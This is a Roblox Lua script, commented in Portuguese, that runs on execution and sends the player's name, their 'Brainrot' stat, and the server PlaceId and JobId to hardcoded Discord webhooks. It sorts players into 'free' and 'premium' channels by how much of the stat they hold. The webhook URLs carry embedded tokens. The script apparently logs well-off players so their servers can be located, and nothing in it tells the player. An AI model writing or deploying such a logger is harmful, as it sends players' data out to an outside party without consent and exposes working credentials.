--=====================================
--      SISTEMA DE LOGS AUTOMÁTICO
--   Free (<50m) | Premium (>=50m)
--=====================================

-- SERVIÇOS
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

--=====================================
-- WEBHOOKS
--=====================================
local WEBHOOK_PREMIUM = "https://discord.com/api/webhooks/1456792064422576138/86tRlAFrSW4ONFXBoggeAQAB1NgaTPh3nR2u1wknSMxaKHZY14Rxzxf8zTYmu3pGeAIP"
local WEBHOOK_FREE = "https://discord.com/api/webhooks/1456791844296982683/_Pxul4PE6HB4WIXqrsIArnMG1o4A8yuIJhzIGC89TjwzGIaGiE9-uKMXuWwG98x3q57z"

--=====================================
-- CONFIGURAÇÃO
--=====================================
local LIMITE_PREMIUM = 50000000 -- 50 milhões

--=====================================
-- FUNÇÃO DE ENVIO
--=====================================
local function enviarLog(webhook, embed)
    local data = {
        embeds = { embed }
    }

    local json = HttpService:JSONEncode(data)
    HttpService:PostAsync(webhook, json)
end

--=====================================
-- COLETA DE DADOS
--=====================================

-- 🧠 BRAINROT (AJUSTE SE NECESSÁRIO)
local brainrot = 0
pcall(function()
    brainrot = player.leaderstats.Brainrot.Value
end)

-- 🌐 SERVIDOR
local serverInfo =
    "PlaceId: " .. game.PlaceId ..
    "\nJobId: " .. game.JobId

--=====================================
-- DEFINIR TIPO DE LOG
--=====================================
local webhook = WEBHOOK_FREE
local cor = 5793266 -- azul
local titulo = "🔓 LOG FREE"

if brainrot >= LIMITE_PREMIUM then
    webhook = WEBHOOK_PREMIUM
    cor = 10181046 -- roxo
    titulo = "💎 LOG PREMIUM"
end

--=====================================
-- EMBED
--=====================================
local embed = {
    title = titulo,
    color = cor,
    fields = {
        {
            name = "👤 Jogador",
            value = player.Name,
            inline = true
        },
        {
            name = "🧠 Brainrot",
            value = tostring(brainrot),
            inline = true
        },
        {
            name = "🌐 Servidor",
            value = serverInfo,
            inline = false
        }
    },
    footer = {
        text = "Sistema de Logs Automático"
    },
    timestamp = DateTime.now():ToIsoDate()
}

--=====================================
-- ENVIO AUTOMÁTICO AO EXECUTAR
--=====================================
enviarLog(webhook, embed)
